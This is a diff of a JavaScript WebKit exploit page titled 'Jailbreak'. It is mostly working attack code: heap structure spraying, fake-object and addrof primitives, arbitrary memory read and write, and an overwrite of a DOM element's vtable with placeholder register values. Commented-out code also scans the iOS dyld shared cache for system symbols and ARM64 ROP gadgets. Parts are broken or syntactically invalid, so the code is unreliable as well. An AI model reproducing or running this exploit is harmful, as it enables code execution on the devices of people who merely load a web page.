@@ -1,446 +1,5 @@
-<html>
-    <head>
-        <style>
-            body {
-                font-family: monospace;
-            }
-            </style>
-        </head>
-    <title>Jailbreak</title>
-    <body>
-        
-        </body>
+<script src="utils.js"> </script>
 <script>
-    //var magic =  r32(base);
-    //log('[+] Which has magic '+magic.toString(16));
-    
-
-//
-// Utility functions.
-//
-// Copyright (c) 2016 Samuel Groß
-//
-
-// Return the hexadecimal representation of the given byte.
-function hex(b) {
-    return ('0' + b.toString(16)).substr(-2);
-}
-
-// Return the hexadecimal representation of the given byte array.
-function hexlify(bytes) {
-    var res = [];
-    for (var i = 0; i < bytes.length; i++)
-        res.push(hex(bytes[i]));
-
-    return res.join('');
-}
-
-// Return the binary data represented by the given hexdecimal string.
-function unhexlify(hexstr) {
-    if (hexstr.length % 2 == 1)
-        throw new TypeError("Invalid hex string");
-
-    var bytes = new Uint8Array(hexstr.length / 2);
-    for (var i = 0; i < hexstr.length; i += 2)
-        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
-
-    return bytes;
-}
-
-function hexdump(data) {
-    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
-        data = Array.from(data);
-
-    var lines = [];
-    for (var i = 0; i < data.length; i += 16) {
-        var chunk = data.slice(i, i+16);
-        var parts = chunk.map(hex);
-        if (parts.length > 8)
-            parts.splice(8, 0, ' ');
-        lines.push(parts.join(' '));
-    }
-
-    return lines.join('\n');
-}
-    // Simplified version of the similarly named python module.
-var Struct = (function() {
-    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
-    var buffer      = new ArrayBuffer(8);
-    var byteView    = new Uint8Array(buffer);
-    var uint32View  = new Uint32Array(buffer);
-    var float64View = new Float64Array(buffer);
-
-    return {
-        pack: function(type, value) {
-            var view = type;        // See below
-            view[0] = value;
-            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
-        },
-
-        unpack: function(type, bytes) {
-            if (bytes.length !== type.BYTES_PER_ELEMENT)
-                throw Error("Invalid bytearray");
-
-            var view = type;        // See below
-            byteView.set(bytes);
-            return view[0];
-        },
-
-        // Available types.
-        int8:    byteView,
-        int32:   uint32View,
-        float64: float64View
-    };
-})();
-
-
-function ab2str(buf) {
-  return String.fromCharCode.apply(null, new Uint16Array(buf));
-}
-
-function str2ab(str) {
-  var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
-  var bufView = new Uint16Array(buf);
-  for (var i=0, strLen=str.length; i < strLen; i++) {
-    bufView[i] = str.charCodeAt(i);
-  }
-  return buf;
-}
-
-
-   
-//
-// Tiny module that provides big (64bit) integers.
-//
-// Copyright (c) 2016 Samuel Groß
-//
-// Requires utils.js
-//
-
-// Datatype to represent 64-bit integers.
-//
-// Internally, the integer is stored as a Uint8Array in little endian byte order.
-function Int64(v) {
-    // The underlying byte array.
-    var bytes = new Uint8Array(8);
-
-    switch (typeof v) {
-        case 'number':
-            v = '0x' + Math.floor(v).toString(16);
-        case 'string':
-            if (v.startsWith('0x'))
-                v = v.substr(2);
-            if (v.length % 2 == 1)
-                v = '0' + v;
-
-            var bigEndian = unhexlify(v, 8);
-            bytes.set(Array.from(bigEndian).reverse());
-            break;
-        case 'object':
-            if (v instanceof Int64) {
-                bytes.set(v.bytes());
-            } else {
-                if (v.length != 8)
-                    throw TypeError("Array must have excactly 8 elements.");
-                bytes.set(v);
-            }
-            break;
-        case 'undefined':
-            break;
-        default:
-            throw TypeError("Int64 constructor requires an argument.");
-    }
-
-    // Return a double whith the same underlying bit representation.
-    this.asDouble = function() {
-        // Check for NaN
-        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
-            throw new RangeError("Integer can not be represented by a double");
-
-        return Struct.unpack(Struct.float64, bytes);
-    };
-
-    // Return a javascript value with the same underlying bit representation.
-    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
-    // due to double conversion constraints.
-    this.asJSValue = function() {
-        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
-            throw new RangeError("Integer can not be represented by a JSValue");
-
-        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
-        this.assignSub(this, 0x1000000000000);
-        var res = Struct.unpack(Struct.float64, bytes);
-        this.assignAdd(this, 0x1000000000000);
-
-        return res;
-    };
-
-
-    // Return the underlying bytes of this number as array.
-    this.bytes = function() {
-        return Array.from(bytes);
-    };
-
-    // Return the byte at the given index.
-    this.byteAt = function(i) {
-        return bytes[i];
-    };
-
-    // Return the value of this number as unsigned hex string.
-    this.toString = function() {
-        return '0x' + hexlify(Array.from(bytes).reverse());
-    };
-
-    this.lo = function()
-    {
-        var b = this.bytes();
-        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
-    };
-
-    this.hi = function()
-    {
-        var b = this.bytes();
-        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
-    };
-
-    this.asInt32 = function() {
-        var value = new Int64(0);
-        for (var i = 0; i < 8; i++) {
-            if (i < 4) {
-                value.bytes[i] = this.bytes[i];
-            } else {
-                value.bytes[i] = 0;
-            }
-        }
-        
-        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
-    };
-    
-    this.asInt16 = function() {
-        var value = new Int64(0);
-        for (var i = 0; i < 8; i++) {
-            if (i < 2) {
-                value.bytes[i] = this.bytes[i];
-            } else {
-                value.bytes[i] = 0;
-            }
-        }
-        
-        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
-    };
-
-    // Basic arithmetic.
-    // These functions assign the result of the computation to their 'this' object.
-
-    // Decorator for Int64 instance operations. Takes care
-    // of converting arguments to Int64 instances if required.
-    function operation(f, nargs) {
-        return function() {
-            if (arguments.length != nargs)
-                throw Error("Not enough arguments for function " + f.name);
-            for (var i = 0; i < arguments.length; i++)
-                if (!(arguments[i] instanceof Int64))
-                    arguments[i] = new Int64(arguments[i]);
-            return f.apply(this, arguments);
-        };
-    }
-
-    // this = -n (two's complement)
-    this.assignNeg = operation(function neg(n) {
-        for (var i = 0; i < 8; i++)
-            bytes[i] = ~n.byteAt(i);
-
-        return this.assignAdd(this, Int64.One);
-    }, 1);
-
-    // this = a + b
-    this.assignAdd = operation(function add(a, b) {
-        var carry = 0;
-        for (var i = 0; i < 8; i++) {
-            var cur = a.byteAt(i) + b.byteAt(i) + carry;
-            carry = cur > 0xff | 0;
-            bytes[i] = cur;
-        }
-        return this;
-    }, 2);
-
-    // this = a - b
-    this.assignSub = operation(function sub(a, b) {
-        var carry = 0;
-        for (var i = 0; i < 8; i++) {
-            var cur = a.byteAt(i) - b.byteAt(i) - carry;
-            carry = cur < 0 | 0;
-            bytes[i] = cur;
-        }
-        return this;
-    }, 2);
-
-     // this = a ^ b
-    this.assignXor = operation(function xor(a, b) {
-        for (var i = 0; i < 8; i++) {
-            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
-        }
-        return this;
-    }, 2);
-    
-
-    // this = a << b
-    this.assignShiftLeft = operation(function shiftLeft(a, b) {
-        for (var i = 0; i < 8; i++) {
-            if (i < b) {
-                bytes[i] = 0;
-            } else {
-                bytes[i] = a.byteAt(Sub(i, b).asInt32());
-            }
-        }
-        return this;
-    }, 2);
-    
-    // this = a >> b
-    this.assignShiftRight = operation(function shiftRight(a, b) {
-        for (var i = 0; i < 8; i++) {
-            if (i < (8 - b)) {
-                bytes[i] = a.byteAt(Add(i, b).asInt32());
-            } else {
-                bytes[i] = 0;
-            }
-        }
-        return this;
-    }, 2);
-}
-
-// Constructs a new Int64 instance with the same bit representation as the provided double.
-Int64.fromDouble = function(d) {
-    var bytes = Struct.pack(Struct.float64, d);
-    return new Int64(bytes);
-};
-
-// Convenience functions. These allocate a new Int64 to hold the result.
-
-// Return -n (two's complement)
-function Neg(n) {
-    return (new Int64()).assignNeg(n);
-}
-
-// Return a + b
-function Add(a, b) {
-    return (new Int64()).assignAdd(a, b);
-}
-
-// Return a - b
-function Sub(a, b) {
-    return (new Int64()).assignSub(a, b);
-}
-
-// Return a ^ b
-function Xor(a, b) {
-    return (new Int64()).assignXor(a, b);
-}
-
-// Return a << b
-function ShiftLeft(a, b) {
-    return (new Int64()).assignShiftLeft(a, b);
-}
-
-// Return a >> b
-function ShiftRight(a, b) {
-    return (new Int64()).assignShiftRight(a, b);
-}
-
-// Some commonly used numbers.
-Int64.Zero = new Int64(0);
-Int64.One = new Int64(1);
-
-// That's all the arithmetic we need for exploiting WebKit.. :)
-    let alert1 = function(msg) {
-        document.body.innerText += msg + '\n';
-    }
-    function dec2hex(n) {
-        if(n < 0) {
-            n = 0xFFFFFFFF + n + 1;
-        }
-        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
-    }
-    function hex2a(hex) {
-var str = '';
-for (var i = 0; i < hex.length; i += 2) {
-    var v = parseInt(hex.substr(i, 2), 16);
-    if (v) str += String.fromCharCode(v);
-}
-return str;
-}
-    function _u32(i)
-{
-    return b2u32(this.read(i, 4));
-}
-
-
-
-
-
-
-
-
-
-function fsyms(mem, base, segs, want, syms)
-{
-    want = Array.from(want); // copy
-    if(syms === undefined)
-    {
-        syms = {};
-    }
-
-    var stab = null;
-    alert1("here");
-    var ncmds = memory.u32(Add(base, 0x10));
-    for(var i = 0, off = 0x20; i < ncmds; ++i)
-    {
-        var cmd = memory.u32(Add(base, off))
-        if(cmd == 0x2) // LC_SYMTAB
-        {
-            var b = memory.read(Add(base, off + 0x8), 0x10);
-            stab =
-            {
-                symoff:  b2u32(b.slice(0x8, 0xc)),
-                nsyms:   b2u32(b.slice(0xc, 0x10)),
-                stroff:  b2u32(b.slice(0x10, 0x14)),
-                strsize: b2u32(b.slice(0x14, 0x18)),
-            };
-            break;
-        }
-        off += memory.u32(Add(base, off + 0x4));
-    }
-    if(stab == null)
-    {
-        fail("stab");
-    }
-    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
-    var fn = function(i)
-    {
-        return memory.read(Add(tmp.base, tmp.off + i),0x10);
-    };
-    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
-    {
-        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
-        for(var j = 0; j < want.length; ++j)
-        {
-            var s = want[j];
-            if((strcmp(fn, s)))
-            {
-                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
-                want.splice(j, 1);
-                break;
-            }
-        }
-    }
-    return syms;
-}
-
-    //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
-    //tmp = base;
-    //var hdr = Add(0x180000000,slide);
-   // log(hdr + hdr1)
-   let count = 1;
 /*
  * This code is taken from a GitHub user that I sadly forgot the name of.
  * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
@@ -498,29 +57,14 @@ function hexdump(buffer, blockSize, base) {
     return lines.join("<br/>");
 }
 let logic = 0;
-
-function mappedAddress(mapping, addr1) {
-    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
-    for (cc = 0; cc < mapping.length; ++cc) {
-        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
-            // >= <
-            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
-            //alert("debug-cacheoffset:" + cacheoffset)
-            return cacheoffset;
-        }
-        else {
-            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
-        }
-    }
-}
-function off2addr(mappings, off)
+function off2addr(segs, off)
     {
   
         if(!(off instanceof Int64)) off = new Int64(off);
-        for(var i = 0; i < mappings.length; ++i)
+        for(var i = 0; i < segs.length; ++i)
         {
-            var start = mappings[i].fileoff; //cachestart
-            var end   = Add(start, segs[i].size); //cacheend
+            var start = segs[i].fileoff;
+            var end   = Add(start, segs[i].size);
            // alert("start" + start + "end" + end + "off" + off)
             if
             (
@@ -529,12 +73,12 @@ function off2addr(mappings, off)
             )
             {
                 //logic = 1;
-                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
-                return Add(mappings[i].addr, Sub(off, start));
+               // alert("returning"+ Add(segs[i].addr, Sub(off, start)));
+                return Add(segs[i].addr, Sub(off, start));
             }
 
         }
-        //return new Int64("0x4141414141414141");
+        return new Int64("0x4141414141414141");
     }
 
 function strcmp(b, str)
@@ -544,7 +88,6 @@ function strcmp(b, str)
     {
         if(fn(i) != str.charCodeAt(i))
         {
-            
             return false;
         }
     }
@@ -690,7 +233,7 @@ function exploit(){
         return confuse[1];
     }
     function pwn()
-{
+    {
 
 function foo(obj) {
    return delete obj['x'];
@@ -705,21 +248,21 @@ function foo(obj) {
    foo({});
    foo({x:0x4141414141});
 }
-        alert1("starting");
+        alert("starting");
         log('[*] Spraying structures to get a butterfly (1/2)...');
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
         var structs = [];
-        for (var i = 0; i < 0x5000; i++) {
+        for (var i = 0; i < 0x100; i++) {
             var a = new Float64Array(1);
             a['prop' + i] = 1337;
             structs.push(a);
         }
         
         log('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 50; i++) {
+        for (var i = 0; i < 1000; i++) {
             var a = new WebAssembly.Memory({inital: 0});
-            a['prop' + i] = 1339;
+            a['prop' + i] = 1337;
             structs.push(a);
         }
         
@@ -730,7 +273,7 @@ function foo(obj) {
         var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
         
         var jsCellHeader = new Int64([
-            0x00, 0x50, 0x00, 0x00,
+            0x00, 0x00, 0x10, 0x00, 
             0x0,                    
             0x2c,                   
             0x08,                  
@@ -782,23 +325,18 @@ function foo(obj) {
         var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
         var maxtry = 0;
         
-        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
-            log('gotcha!');
-            //continue;
-        } else {
-            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+        if (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+        while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
             jsCellHeader.assignAdd(jsCellHeader, Int64.One);
             wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
             maxtry++;
-            if (maxtry == 100000)
-            {
-                fail("wow 5000 tries on getting valid structid failed!!!");
+            if (maxtry == 5000) {
+                fail("5000 tries on getting valid structid failed!!!");
             }
         }
-            log('[+] Successfully got fakeobj as WASMObject');
-    } /*else {
+    } else {
         log('[+] Successfully got fakeobj as WASMObject');
-    }*/
+    }
         //log('[+] Successfully got fakeobj as WASMObject');
         var wasmMemRawAddr = __addrof(wasmInternalMemory);
         var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
@@ -966,47 +504,381 @@ function foo(obj) {
             addr= new Int64(addr);
             return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
         };
-        memory.u32 = _u32;
-        log('[*] Creating the HTMLDivElement wrapper...');
+        //log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
-        log('[+] Address of the div is '+ad_div.toString(16));
+       // log('[+] Address of the div is '+ad_div.toString(16));
         //alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
-        log('[+] Executable instance is at '+exe_ptr.toString(16));
+        //log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
-        log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
+        //log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
-        
-        /*var bb = {};
-        bb[0] = 1.1
-        var bbaddr = stage2.addrof(bb);
-        //about to burn a vtable leak method publically RIP
-         log("object address?" + hex1(bbaddr));
-        var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
-        log("JSC::VM Struct @" + hex1(vm));
-        //m_runloop contains a vtable at offset 0...
-        // m_runloop is + 0x18 from JSC::VMStruct!
-        var m_runloop = stage2.read64(vm + 0x18);
-        //hopefully points to JavaScriptCore Base!
-        log("m_runloop @ " + hex1(m_runloop))
-        var vtable = stage2.read64(m_runloop);
-        var jscbase = stage2.read64(vtable);
-        log("vtable @ " + hex1(vtable));
-        log("JSC __TEXT::text instance @ " + hex1(jscbase))
-	var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
-	log("JSC __TEXT header @" + header);
-    log("v_tlb vs vtable" + vtable + v_tlb);
-    log("anchor vs jscbase" + anchor + jscbase);*/
-        
-        
-        
-        success = 0;
-        }
-        
+        //log('anchor' + anchor)
+        var hdr = Sub(anchor, anchor.lo() & 0xfff);
+        var b = [];
+    memory.write_non_zero(v_tlb, [
+        0x41414141, // fake vtable
+        0,
+        0x42424242, // x21
+        0, 0, 0, 0, 0, 0, 0,
+        0, // fp
 
+        0x31313131, // lr
+        0,
+        0x51515151, // sp
+    ])
+        d.addEventListener('click', function(){})
+        /*
+        //var vtab = 0x1B205A808;
+        //var nslide = Sub(v_tlb, vtab); 
+        //var slide = Sub(nslide, new Int64('0x10'));
+        //log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
+        //var jbase = Add(new Int64('0x1881BD000'), slide);
+       // log('[+] And thus the JavaScriptCore base is '+jbase.toString(16));
+        //var magic =  r32(base);
+        //log('[+] Which has magic '+magic.toString(16));
+        function hex2a(hex) {
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2) {
+        var v = parseInt(hex.substr(i, 2), 16);
+        if (v) str += String.fromCharCode(v);
+    }
+    return str;
+}  
+        function _u32(i)
+    {
+        return b2u32(this.read(i, 4));
+    }
+    memory.u32 = _u32;
+   function fsyms(mem, base, segs, want, syms)
+    {
+        want = Array.from(want); // copy
+        if(syms === undefined)
+        {
+            syms = {};
+        }
+        var stab = null;
+        alert("here");
+        var ncmds = memory.u32(Add(base, 0x10));
+        for(var i = 0, off = 0x20; i < ncmds; ++i)
+        {
+            var cmd = memory.u32(Add(base, off))
+            if(cmd == 0x2) // LC_SYMTAB
+            {
+                var b = memory.read(Add(base, off + 0x8), 0x10);
+                stab =
+                {
+                    symoff:  b2u32(b.slice(0x8, 0xc)),
+                    nsyms:   b2u32(b.slice(0xc, 0x10)),
+                    stroff:  b2u32(b.slice(0x10, 0x14)),
+                    strsize: b2u32(b.slice(0x14, 0x18)),
+                };
+                break;
+            }
+            off += memory.u32(Add(base, off + 0x4));
+        }
+        if(stab == null)
+        {
+            fail("stab");
+        }
+        var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
+        var fn = function(i)
+        {
+            return memory.read(Add(tmp.base, tmp.off + i),1)[0];
+        };
+        for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
+        {
+            tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
+            for(var j = 0; j < want.length; ++j)
+            {
+                var s = want[j];
+                if((strcmp(fn, s)))
+                {
+                    syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
+                    want.splice(j, 1);
+                    break;
+                }
+            }
+        }
+        return syms;
+    }
+        //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
+        //tmp = base;
+        //var hdr = Add(0x180000000,slide);
+       // log(hdr + hdr1)
+        while(true)
+        {
+        //if (memory.readInt64(hdr).lo() == 4277009104) {
+          //alert('WebCore ' + hdr + ' post spectre support coming soon...mightnotwork');
+        //}
+        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
+        {
+            //alert(memory.read(hdr, 0x10)[0]))
+            break;
+        }
+        hdr = Sub(hdr, 0x1000);
+        }
+        //alert('dyld cache header @' + hdr);
+        var uuid = memory.u32(Add(hdr, 0x58));
+       // alert("uuid:" + uuid) //+ "uuid..."+ memory.read_i64(hdr + 0x58))
+        //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
+        
+        function ab2str(buf) {
+  return String.fromCharCode.apply(null, new Uint16Array(buf));
+}
+        //alert('Mach-O magic' + memory.u32(hdr))
+        var base_seg = null;
+       // alert("nsegs test" + memory.read_i32(hdr+0x14))
+        var nsegs    = memory.u32(Add(hdr, 0x14));
+       // alert(memory.u32(hdr + 0x18) + "segment"+ nsegs*0x20 + "sets")
+        var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
+        var segs     = [];
+        for(var z = 0; z < nsegs; ++z)
+        {
+            var off = z * 0x20;
+            var seg =
+            {
+            addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
+            size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
+            fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
+            maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
+            initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
+            };
+            segs.push(seg);
+            var max_rights = "";
+            var init_rights = "";
+            if(seg.maxprot & VM_PROT_NONE){
+                max_rights += "-";
+            }
+            if(seg.maxprot & VM_PROT_READ) {
+                max_rights += "r";
+            }
+            if(seg.maxprot & VM_PROT_WRITE) {
+                max_rights += "w";
+            }
+            if(seg.maxprot & VM_PROT_EXECUTE){
+                max_rights += "x";
+            }
+            if(seg.initprot & VM_PROT_NONE){
+                init_rights += "-";
+            }
+            if(seg.initprot & VM_PROT_READ) {
+                init_rights += "r";
+            }
+            if(seg.initprot & VM_PROT_WRITE) {
+                init_rights += "w";
+            }
+            if(seg.initprot & VM_PROT_EXECUTE){
+                init_rights += "x";
+            }
+            if(max_rights.length < 4){
+                max_rights = "-" + max_rights;
+            }
+            if(init_rights.length < 4){
+                init_rights = "-" + init_rights;
+            }
+           // log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
+            //memory.read_i32(
+            if(seg.fileoff == 0 && seg.size != 0)
+            {
+                base_seg = seg;
+               // alert(base_seg.addr)
+            }
+        }
+        if(base_seg == null)
+        {
+            fail("base_seg");
+        }
+        var cache_slide = Sub(hdr, base_seg.addr);
+        //alert("cache slide" + cache_slide + "vs" + memory.u32(hdr+0x38));
+        //base_seg.addr = Add(base_seg.addr, cache_slide
+        for(var i = 0; i < segs.length; ++i)
+        {
+            segs[i].addr = Add(segs[i].addr, cache_slide);
+        }
+        var libs =
+        {
+            "/usr/lib/system/libdyld.dylib":                                        ["_dlsym", "_dlopen"],
+            "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
+            "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
+            "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
+            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
+                "__ZN3JSC38taggedStartOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC36taggedEndOfFixedExecutableMemoryPoolE",
+            ],
+        };
+        var opcodes;
+        var opcode_libs;
+            libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
+                "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
+            )
+            opcodes = {
+                // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
+                "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
+                "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // mov x4, x20 ; blr x8
+                "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
+                // ldr x0, [x0] -- for debugging
+                "ldrx0x0":     [ 0xf9400000 ],
+            }
+            opcode_libs = [
+              //  "/usr/lib/libpthread.dylib",     // dispatch, stackloader
+               // "/usr/lib/libc++.dylib",  // ldrx8, regloader, movx4, stackloader
+                "/System/Library/Frameworks/ModelIO.framework/ModelIO",
+                "/System/Library/Frameworks/CoreAudio.framework/CoreAudio",
+            ];
+        
+        //print('lookin through cache');
+       
+        var syms = {};
+        var gadgets = {};
+      //  alert("dyld base address" + memory.u32(hdr + 0x20))
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x88)));
+        //alert("imgs"+imgs)
+        var nimgs = memory.u32(Add(hdr, 0x1c));
+        //alert(nimgs + "n")
+        for(var i = 0; i < nimgs; ++i)
+        {
+            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x1c)));
+            var fn = function(i,oz)
+            {  if(oz) { return memory.read(Add(straddr, i), 0x10);
+            }
+                return memory.read(Add(straddr, i), 1)[0];
+            };
+           // alert(ab2str(fn(i,0)))
+            var base = Add(memory.readInt64(Add(imgs, i * 0x20 + 0x10)), cache_slide);
+           // alert(base + "vs" + memory.u32(Add(imgs,i * 0x20 + 0x10)))
+            if(opcode_libs.some(lib => strcmp(fn, lib)))
+            {
+               //alert("here1")
+                var ncmds = memory.u32(Add(base, 0x10));
+                for(var j = 0, off = 0x20; j < ncmds; ++j)
+                {
+                // alert("here")
+                    var cmd = memory.u32(Add(base, off));
+                    if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x10), 0x10), "__TEXT")) // LC_SEGMENT_64
+                    {
+                        var nsects = memory.u32(Add(base, off + 0x40));
+                        for(var k = 0, let o = off + 0x48; k < nsects; ++k)
+                        {
+                            if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
+                            {
+                                var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
+                                if (keys.length == 0) break;
+                                var match = {};
+                                for(var z = 0; z < keys.length; ++z)
+                                {
+                                    match[keys[z]] = 0;
+                                }
+                                var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
+                                var size = memory.u32(Add(base, o + 0x28))
+                                //alert("here")
+                                // Copy the entire __text region into a Uint32Array for faster processing.
+                                // Previously you could map a Uint32Array over the data, but on i7+ devices
+                                // this caused access violations.
+                                // Instead we read the entire region and copy it into a Uint32Array. The
+                                // memory.read primitive has a weird limitation where it's only able to read
+                                // up to 4096 bytes. to get around this we'll read multiple times and combine
+                                // them into one.
+                                var allData = new Uint32Array(size / 4)
+                                for (var r = 0; r < size; r += 4096) {
+                                    // Check to ensure we don't read out of the region we want
+                                    var qty = 4096
+                                    if (size - r < qty) {
+                                        qty = size - r
+                                    }
+                                    var data = memory.read(Add(addr, r), qty)
+                                    // Data is an array of single bytes. This code takes four entries
+                                    // and converts them into a single 32-bit integer. It then adds it
+                                    // into the `allData` array at the given index
+                                    for (var h = 0; h < qty; h += 4) {
+                                        var fourBytes = b2u32(data.slice(h, h + 4))
+                                        allData[(r + h) / 4] = fourBytes
+                                    }
+                                }
+                                // Loop through the entire data map looking for each gadget we need
+                                for (var f = 0; f < size && keys.length > 0; f++) {
+                                    var op = allData[f]
+                                    for (var z = 0; z < keys.length; z++) {
+                                        var key = keys[z]
+                                        var opcode = opcodes[key]
+                                        if (op == opcode[match[key]]) {
+                                            match[key]++
+                                            if (match[key] == opcode.length) {
+                                                gadgets[key] = Add(addr, (f - (opcode.length - 1)) * 4)
+                                                keys.splice(z, 1)
+                                                break
+                                            }
+                                        } else {
+                                            match[key] = 0
+                                        }
+                                    }
+                                }
+                                break
+                            }
+                            o += 0x50;
+                        }
+                        break;
+                    }
+                    off += memory.u32(Add(base, off + 0x4));
+                }
+                continue;
+            }
+            var lookup = null;
+            for(var k = Object.keys(libs), j = 0; j < k.length; ++j)
+            {
+                if(strcmp(fn, k[j]))
+                {
+                    lookup = libs[k[j]];
+                    break;
+                }
+            }
+            let mem3 = memory;
+            if(lookup != null)
+            {
+                fsyms(mem3, base, segs, lookup, syms);
+            }
+        }
+        if(!gadgets['dispatch'])
+        {
+            gadgets['dispatch'] = gadgets['altdispatch'];
+        }
+        if(!gadgets['stackloader'])
+        {
+            gadgets['stackloader'] = gadgets['altstackloader'];
+        }
+        delete opcodes['altdispatch'];
+        delete opcodes['altstackloader'];
+        var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
+        for(var i = 0; i < k.length; ++i)
+        {
+            var s = k[i];
+            if(syms[s] == null)
+            {
+                fail(s);
+            }
+            syms[s] = Add(syms[s], cache_slide);
+        }
+        k = Object.keys(opcodes);
+        for(var i = 0; i < k.length; ++i)
+        {
+            var s = k[i];
+            if(gadgets[s] == null)
+            {
+                fail(s);
+            }
+        }
+     alert("done! Exploitation complete stage1")*/
+}
     
-    let log = alert1
+    let log = alert
     var success = 2;
         try{
         pwn();
